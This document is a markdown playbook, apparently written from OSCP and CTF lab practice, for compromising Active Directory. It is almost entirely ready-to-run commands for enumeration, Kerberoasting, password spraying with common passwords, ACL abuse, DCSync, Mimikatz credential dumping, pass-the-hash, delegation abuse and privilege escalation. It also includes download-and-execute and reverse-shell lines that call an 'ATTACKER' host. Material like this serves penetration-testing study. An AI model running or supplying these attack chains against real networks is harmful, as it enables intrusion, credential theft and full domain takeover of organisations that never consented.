# Active Directory Attack Chain Playbook — Husky Hacker

Based on real techniques from: Greenfield, Meridian, Ridgeline, Secura, HSM Defense, trilocor, Medtech, OSCP Labs A–D.

---

## Phase 1: Initial Enumeration (With Any Domain Creds)

```bash
# Infinite Void — full AD dump in seconds
python3 infinite_void.py -d $AD_DOMAIN -u $AD_USER -p $AD_PASS -dc $AD_DC -o ./loot/

# BloodHound collection
bloodhound-python -u $AD_USER -p $AD_PASS -d $AD_DOMAIN -ns $AD_DC -c All
# Import the .zip into BloodHound → Shortest Path to Domain Admins

# CrackMapExec fingerprint
crackmapexec smb $AD_DC -u $AD_USER -p $AD_PASS -d $AD_DOMAIN
crackmapexec smb $AD_DC -u $AD_USER -p $AD_PASS --shares

# PowerView (from Windows foothold)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/ad/PowerView.ps1')
Get-DomainUser | select samaccountname,description | fl
Get-DomainGroup -AdminCount | select samaccountname
Get-DomainComputer | select dnshostname,operatingSystem
Find-DomainShare -CheckShareAccess
Get-DomainGPO | select displayname,gpcfilesyspath
```

---

## Phase 2: Quick Wins — Check These First

### 1. Password in Description Fields
**Hit on:** Greenfield (Onboarding-Guide.txt), Ridgeline (password-reset-log.txt), Meridian (IDOR leak), HSM Defense (MariaDB hashes)

```bash
# Infinite Void checks this automatically
# Or manual LDAP query
ldapsearch -x -H ldap://$AD_DC -D "$AD_USER@$AD_DOMAIN" -w "$AD_PASS" \
  -b "DC=${AD_DOMAIN%%.*},DC=${AD_DOMAIN##*.}" \
  '(&(objectClass=user)(description=*pass*))' samAccountName description
```

### 2. Kerberoasting
**Hit on:** trilocor (divanov:Dimitris2001), HSM Defense (ryan.cole:napalmcrack), Ridgeline (svc_sql), OSCP Lab B (sql_svc:Dolphin1)

```bash
# Find and roast SPNs
impacket-GetUserSPNs "$AD_DOMAIN/$AD_USER:$AD_PASS" -dc-ip $AD_DC -request -outputfile kerb.hash

# Crack
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# Targeted Kerberoast (if you have GenericWrite/GenericAll on a user)
# Set an SPN then roast it
bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  set object TARGET_USER servicePrincipalName -v 'HTTP/pwned'
impacket-GetUserSPNs "$AD_DOMAIN/$AD_USER:$AD_PASS" -dc-ip $AD_DC -request
```

### 3. AS-REP Roasting
**Hit on:** Ridgeline (s.patel:Welcome1!)

```bash
# With user list from infinite_void
impacket-GetNPUsers "$AD_DOMAIN/" -usersfile loot/${AD_DOMAIN%%.*}_users.txt \
  -no-pass -dc-ip $AD_DC -outputfile asrep.hash

# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### 4. Password Spraying
**Hit on:** Greenfield (Greenfield2025!), Meridian (MeridianTemp2024!), HSM Defense (caleb.turner:newpassword123), New Hire (MegaCorp2026!)

```bash
# Check lockout policy first (infinite_void reports this)
# If lockout threshold = 0 → spray freely

# CrackMapExec spray
crackmapexec smb $AD_DC -u users.txt -p 'Company2026!' -d $AD_DOMAIN --continue-on-success

# Kerbrute (faster, less noisy)
kerbrute passwordspray -d $AD_DOMAIN --dc $AD_DC users.txt 'Welcome1!'

# Common patterns to try
Company2024!  Company2025!  Company2026!
Welcome1!  Welcome2024!
Password1!  Password123
Season+Year: Summer2024! Winter2025! Spring2026!
```

### 5. SMB Shares
**Hit on:** Greenfield (Public → Onboarding-Guide), New Hire (HR → employees.eml, IT → KeePass), Ridgeline (IT-Support → password-reset-log), Medtech

```bash
# Enumerate with every set of creds you find
crackmapexec smb $AD_DC -u $AD_USER -p $AD_PASS --shares
smbclient -U "$AD_USER%$AD_PASS" -L //$AD_DC/

# Spider shares for interesting files
crackmapexec smb $AD_DC -u $AD_USER -p $AD_PASS -M spider_plus

# Access and download
smbclient -U "$AD_USER%$AD_PASS" //$AD_DC/ShareName
> recurse ON
> prompt OFF
> mget *
```

---

## Phase 3: ACL Abuse Chains

**This is the core of OSCP AD boxes.** BloodHound shows the path, adchain gives you the commands.

### GenericAll (Full Control)
**Hit on:** Greenfield (IT Helpdesk → svc_backup), trilocor (Exchange Trusted Subsystem)

```bash
# Reset target's password
bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  set password TARGET_USER 'NewP@ssw0rd123!'

# Or via net rpc
net rpc password TARGET_USER 'NewP@ssw0rd123!' \
  -U "$AD_DOMAIN/$AD_USER%$AD_PASS" -S $AD_DC

# Or targeted Kerberoast (set SPN → roast)
```

### WriteDACL
**Hit on:** Meridian (IT Operations → svc_backup), HSM Defense (svc_delegate), trilocor (F9)

```bash
# Grant yourself DCSync rights
bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  add genericAll TARGET_USER $AD_USER

# Or use impacket dacledit
impacket-dacledit -action write -rights DCSync -principal $AD_USER \
  -target-dn "DC=${AD_DOMAIN%%.*},DC=${AD_DOMAIN##*.}" \
  "$AD_DOMAIN/$AD_USER:$AD_PASS"
```

### WriteOwner
**Hit on:** HSM Defense (WriteOwner ServiceDesk)

```bash
# Take ownership → grant GenericAll → exploit
bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  set owner TARGET_USER $AD_USER

bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  add genericAll TARGET_USER $AD_USER
```

### ForceChangePassword
**Hit on:** Meridian (chain hop), HSM Defense (logon hours bypass)

```bash
bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  set password TARGET_USER 'NewP@ssw0rd123!'

# If bloodyAD fails (HSM Defense pattern), use PowerView.py or rpcclient
rpcclient -U "$AD_USER%$AD_PASS" $AD_DC \
  -c "setuserinfo2 TARGET_USER 23 NewP@ssw0rd123!"
```

### AddMember / AddSelf
**Hit on:** trilocor (Account Operators → Exchange Trusted Subsystem)

```bash
bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  add groupMember "TARGET_GROUP" $AD_USER
```

### Use adchain for multi-hop
```bash
# Feed the entire BloodHound path
adchain chain "user1>GenericAll>user2>WriteDACL>svc>DCSync>domain" \
  -d $AD_DOMAIN --dc-ip $AD_DC -p "$AD_PASS"
```

---

## Phase 4: Credential Extraction

### DCSync (The Goal)
**Hit on:** Greenfield, Meridian, Secura, HSM Defense, trilocor, OSCP Labs

```bash
# With DCSync rights
impacket-secretsdump "$AD_DOMAIN/$AD_USER:$AD_PASS"@$AD_DC

# With hash
impacket-secretsdump "$AD_DOMAIN/$AD_USER"@$AD_DC -hashes :NTLM_HASH

# Output: Administrator:500:aad3...:NTLM_HASH:::
# Grab the Administrator NTLM hash → PtH
```

### Mimikatz (From Windows Foothold)
```powershell
# Dump everything
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords          # logged-on user creds
lsadump::sam                       # local SAM
lsadump::dcsync /domain:$AD_DOMAIN /user:Administrator   # DCSync
lsadump::lsa /inject              # LSA secrets

# Credman (Secura pattern)
vault::list
vault::cred
```

### SAM/SYSTEM Dump (New Hire pattern)
```powershell
# On target as SYSTEM
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Transfer to attacker, then:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### LAPS
```bash
# If you can read LAPS passwords
bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  get object 'TARGET_COMPUTER$' --attr ms-Mcs-AdmPwd
```

### GMSA (trilocor pattern)
```bash
bloodyAD -d $AD_DOMAIN -u $AD_USER -p $AD_PASS --host $AD_DC \
  get object 'svc_gmsa$' --attr msDS-ManagedPassword

# Then use the extracted hash
evil-winrm -i $TARGET -u 'svc_gmsa$' -H 'EXTRACTED_HASH'
```

---

## Phase 5: Lateral Movement

### Pass-the-Hash
**Hit on:** Greenfield, Secura, HSM Defense, every AD box

```bash
# PsExec (SYSTEM shell)
impacket-psexec "$AD_DOMAIN/Administrator"@$TARGET -hashes :NTLM_HASH

# WmiExec (no service creation, stealthier)
impacket-wmiexec "$AD_DOMAIN/Administrator"@$TARGET -hashes :NTLM_HASH

# Evil-WinRM
evil-winrm -i $TARGET -u Administrator -H 'NTLM_HASH'

# CrackMapExec — check where the hash works
crackmapexec smb $AD_DC $AD_MS01 $AD_MS02 -u Administrator -H 'NTLM_HASH' -d $AD_DOMAIN
```

### WinRM
```bash
evil-winrm -i $TARGET -u $AD_USER -p $AD_PASS
evil-winrm -i $TARGET -u $AD_USER -H 'NTLM_HASH'
```

### RDP
```bash
xfreerdp /v:$TARGET /u:$AD_USER /p:'$AD_PASS' /d:$AD_DOMAIN +clipboard /dynamic-resolution
```

### Credential Reuse (ALWAYS try)
**Hit on:** Medtech, OSCP Lab C, OSCP Lab D

```bash
# Try every password against every user on every box
crackmapexec smb $AD_DC $AD_MS01 $AD_MS02 \
  -u users.txt -p 'found_password' -d $AD_DOMAIN --continue-on-success

crackmapexec winrm $AD_DC $AD_MS01 $AD_MS02 \
  -u users.txt -p 'found_password' -d $AD_DOMAIN --continue-on-success
```

---

## Phase 6: Delegation Attacks

### Constrained Delegation (HSM Defense pattern)
```bash
# S4U2Self + S4U2Proxy → impersonate Administrator
impacket-getST -spn 'cifs/DC01.domain.local' -impersonate Administrator \
  "$AD_DOMAIN/svc_delegate:password" -dc-ip $AD_DC

export KRB5CCNAME=Administrator@cifs_DC01.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec -k -no-pass $AD_DOMAIN/Administrator@DC01.$AD_DOMAIN
```

### RBCD (Resource-Based Constrained Delegation)
```bash
# Create machine account
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Password1' \
  "$AD_DOMAIN/$AD_USER:$AD_PASS" -dc-ip $AD_DC

# Configure RBCD
impacket-rbcd "$AD_DOMAIN/$AD_USER:$AD_PASS" -action write \
  -delegate-to 'TARGET_COMPUTER$' -delegate-from 'EVIL$' -dc-ip $AD_DC

# Get ticket
impacket-getST -spn "cifs/TARGET.${AD_DOMAIN}" -impersonate Administrator \
  "$AD_DOMAIN/EVIL\$:Password1" -dc-ip $AD_DC

# Use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET.$AD_DOMAIN
```

---

## Phase 7: Privesc on Windows AD Machines

### SeImpersonatePrivilege (Most Common)
**Hit on:** OSCP Lab A (MS01), Lab B (Gust), Lab C, Secura, Medtech, New Hire

```powershell
# GodPotato (try first)
GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe ATTACKER 4444 -e cmd.exe"

# PrintSpoofer
PrintSpoofer64.exe -i -c cmd

# SigmaPotato
SigmaPotato.exe --revshell --host ATTACKER --port 4444
```

### Service Binary Hijack
**Hit on:** trilocor (Server Operators), OSCP Lab C (GPGOrchestrator)

```powershell
# Find modifiable services
sc qc <service>
icacls "C:\path\to\service.exe"

# Hijack binpath
sc config <service> binPath= "cmd /c net localgroup Administrators USER /add"
sc stop <service>
sc start <service>
```

### GPO Abuse (Secura pattern)
```bash
# If you can modify GPOs
python3 pygpoabuse.py "$AD_DOMAIN/$AD_USER:$AD_PASS" \
  -gpo-id '<GPO_ID>' \
  -command 'net localgroup Administrators $AD_USER /add' -f
```

---

## Phase 8: Pivoting in AD

```bash
# Ligolo-ng (full tunnel — best for AD)
pivot ligolo -a $ATTACKER -p $AD_MS01 -n 172.16.0.0/24

# REMEMBER: Reverse shells from internal AD hosts
# must target the PIVOT HOST IP, not your tun0!
# Listener goes on the pivot host or use a ligolo listener_add

# Chisel SOCKS (quick alternative)
pivot chisel -a $ATTACKER -p $AD_MS01

# proxychains for internal scanning
proxychains4 nmap -sT -Pn INTERNAL_TARGET
proxychains4 crackmapexec smb INTERNAL_SUBNET/24 -u user -p pass
proxychains4 evil-winrm -i INTERNAL_TARGET -u user -p pass
```

---

## Common AD Attack Chains (From Your Boxes)

### Greenfield (Easy)
```
SMB anon → share leak → default password spray → foothold →
BloodHound → GenericAll → password change → DCSync → PtH → root
```

### Meridian (Medium)
```
Web IDOR → temp password → spray → SSH → BloodHound →
3-hop ACL (GenericAll → WriteDACL → DCSync) → PtH → root
```

### HSM Defense (Hard)
```
ODT phishing → Kerberos creds → Timeroast → WriteOwner →
ForceChangePassword → MariaDB hashes → spray → user.txt →
OU move → Kerberoast → WriteDACL → constrained delegation →
getST impersonate → secretsdump → PtH → root
```

### Secura (OSCP Lab D)
```
XAMPP → Evil-WinRM → MySQL ibd leak → credential reuse →
SeImpersonate → SigmaPotato → Mimikatz credman →
pyGPOAbuse → Domain Admins → secretsdump → PtH → root
```

### trilocor (12-flag CPTS)
```
Drupal RCE → Rocket.Chat → Gogs → LFI+filter chain → SSH →
NFS mount → Liferay Groovy → SeTcbPrivilege → password reset →
RDP → RemoteMouse → lazagne → coerced auth → ACL chain →
Kerberoast → GMSA → Server Operators → sc.exe → Ansible vault
```

---

*"Own the chain. Own the domain." — Husky Hacker*
